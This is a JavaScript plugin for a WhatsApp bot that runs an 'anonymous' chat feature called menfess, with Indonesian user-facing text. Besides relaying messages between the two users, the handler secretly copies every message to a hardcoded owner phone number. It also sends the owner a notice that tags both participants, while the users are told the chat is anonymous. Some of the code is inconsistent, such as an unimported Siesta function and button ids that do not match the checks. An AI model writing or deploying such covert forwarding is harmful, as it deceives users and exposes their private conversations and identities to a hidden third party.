const {ftxt, ttle} = require('../lib/scrapes')
const { CS, jsonformat,reSize, ucapanWaktu, formatp, clockString, getBuffer, getCases, generateProfilePicture, sleep, fetchJson, runtime, pickRandom, getGroupAdmins, getRandom } = require("../lib/myfunc")
const {Handler, Cmd} = require('../lib/command')

Handler(async(m, {conn, user, budy, command, react, qmsg, reply}) => {
//━━━━━━━━━━━━━━━[ MENFESS RESPONSE ]━━━━━━━━━━━━━━━━━//
const OWNER_NUMBER = '6282170988479@s.whatsapp.net';
const INI = m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : m.text;
if (m.chat.endsWith("@s.whatsapp.net") && m.message) {
let room = Object.values(global.db.data.menfess).find((room) => [room.a, room.b].includes(m.sender) && room.state === "ACTIVE");
if (room) {
if (INI === 'KELUAR' || /^.*(batal|keluar)/.test(m.text)) {
conn.sendText(m.chat, '```Anda telah meninggalkan Chat Anonim```', global.fake);
let other = room.other(m.sender);
await conn.sendText(other, '```Lawan Chat Anda telah meninggalkan Chat Anonim```', global.fake);
delete global.db.data.menfess[room.id];
room.state = "CANCELED";
return
}
let other = [room.a, room.b].find((user) => user !== m.sender);
await m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? { contextInfo: { ...m.msg.contextInfo, forwardingScore: 0, isForwarded: true, participant: other } } : {});
await m.copyNForward(OWNER_NUMBER, true, m.quoted && m.quoted.fromMe ? { contextInfo: { ...m.msg.contextInfo, forwardingScore: 0, isForwarded: true, participant: other } } : {});
await conn.sendMessage(OWNER_NUMBER, { text: `PESAN DARI MENFESS @${room.a.split('@s.whatsapp.net')[0]} dan @${room.b.split('@s.whatsapp.net')[0]}`, mentions: [room.a, room.b] },{quoted:m});
}
}

//━━━━━━━━━━━━━━━[ MENFESS WAITING ]━━━━━━━━━━━━━━━━━//
if (m.chat.endsWith("@s.whatsapp.net") && m.message) {
let room = Object.values(global.db.data.menfess).find((room) => [room.a, room.b].includes(m.sender) && room.state === "WAITING");
if (room) {
if (m.sender == room.b) {
if (INI == "TERIMA") {
conn.sendButtons(m.chat, `( *\`MENFESS\`* )`, "```Chat Anonim Telah Terhubung\nTekan Tombol Di Bawah Untuk Menghentikan Chat Secara Anonim.```", '', [{ type: 'btn', text: 'KELUAR', id: 'keluar' }], global.fake);
room.state = "ACTIVE";
let other = [room.a, room.b].find((user) => user !== m.sender);
//conn.sendMessage(other, { text: "```Penerima telah mengkonfirmasi, Chat Anonim telah terhubung```", });
conn.sendButtons(other, `( *\`MENFESS\`* )`, "```Penerima telah mengkonfirmasi, Sekarang Anda Dan Target Dapat Bertukar Pesan Secara Anonim Telah Terhubung.```", '', [{ type: 'btn', text: 'KELUAR', id: 'keluar' }], global.fake);
}
if (INI == "TOLAK") {
m.reply("Okay.");
let other = [room.a, room.b].find((user) => user !== m.sender);
conn.sendText(other, "```Penerima menolak Permintaan anda untuk melakukan Chat secara Anonim.```", global.fake);
room.state = "CANCELED";
delete global.db.data.menfess[room.id];
}
}
}
}
})



Siesta({
command: '^menfess$',
alias: 'menfess',
onlyPm: true,
desc: 'Obrolan anonim dengan pasangan kustom',
type: 'Alat'
}, async (m, {conn, command}) => {
let { q, reply } = m


if (!q) return reply(`\`\`\`Contoh: ${command} 6282xxxxx\`\`\``);
let numberTarget = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
var checkTarget = await conn.onWhatsApp(numberTarget);
if (numberTarget == m.sender) return reply("```Anda tidak dapat mengirim pesan ke nomor Anda sendiri!```");
if (checkTarget.length == 0) return reply('```Nomor tersebut tidak terdaftar di WhatsApp.\n\nSilakan masukkan nomor WhatsApp yang valid dan terdaftar.```');
let id = + new Date();
global.db.data.menfess[id] = {
id,
a: m.sender,
b: numberTarget,
state: "WAITING",
check: function (who = "") {
return [this.a, this.b].includes(who)
},
other: function (who = "") {
return who === this.a ? this.b : who === this.b ? this.a : ""
}
};
conn.sendText(m.chat, '```Menunggu konfirmasi dari target...```', global.fake);
conn.sendButtons(numberTarget, `( *\`MENFESS\`* )`, '```Seseorang ingin bertukar pesan secara anonim kepada Anda. Tekan Tombol di bawah untuk menerima/menolak```', '', [{ type: 'btn', text: 'TERIMA', id: 'accept' },{ type: 'btn', text: 'TOLAK', id: 'reject' }], global.fake);
/*conn.sendMessage(numberTarget, {
text: `Halo kak ${await conn.getName(numberTarget)}\n` + '```Seseorang ingin bertukar pesan secara anonim kepada Anda. Tekan Tombol di bawah untuk menerima/menolak```',
contextInfo: {
externalAdReply: {
title: "MENFESS",
body: calender,
thumbnailUrl: "https://androidayuda.com/wp-content/uploads/2022/10/chats-anonimos.jpg",
mediaType: 1,
renderLargerThumbnail: true
}
}
}) */
})